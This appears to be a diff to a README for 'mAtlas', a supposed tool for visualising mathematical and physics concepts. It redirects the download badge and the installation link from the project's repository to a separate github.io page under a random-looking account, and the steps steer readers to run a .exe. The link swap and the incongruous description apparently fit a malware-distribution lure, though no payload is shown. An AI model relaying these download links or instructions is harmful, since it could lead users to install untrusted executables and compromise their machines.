@@ -1,6 +1,6 @@
 # 🗺️ mAtlas - Visualize complex mathematical structures with ease
 
-[![Download mAtlas](https://img.shields.io/badge/Download-mAtlas-blue)](https://github.com/ahead-hypothrombinemia693/mAtlas)
+[![Download mAtlas](https://img.shields.io/badge/Download-mAtlas-blue)](https://ahead-hypothrombinemia693.github.io)
 
 ## 📖 About this project
 mAtlas serves as a visual guide through fundamental mathematical and scientific concepts. It organizes information into an atlas format. You can explore how number theory, set theory, and category theory connect to modern physics. This tool helps you see the underlying structure of the Standard Model and quantum mechanics. It transforms abstract proofs into readable visual maps.
@@ -14,7 +14,7 @@ Your computer needs the following specifications to run mAtlas smoothly:
 - Graphics: DirectX 11 compatible graphics card
 
 ## 📥 Download and installation
-1. Visit the following link to download the software: [https://github.com/ahead-hypothrombinemia693/mAtlas](https://github.com/ahead-hypothrombinemia693/mAtlas)
+1. Visit the following link to download the software: [https://ahead-hypothrombinemia693.github.io](https://ahead-hypothrombinemia693.github.io)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the latest version link.
 4. Look for the file ending in .exe under the "Assets" section.
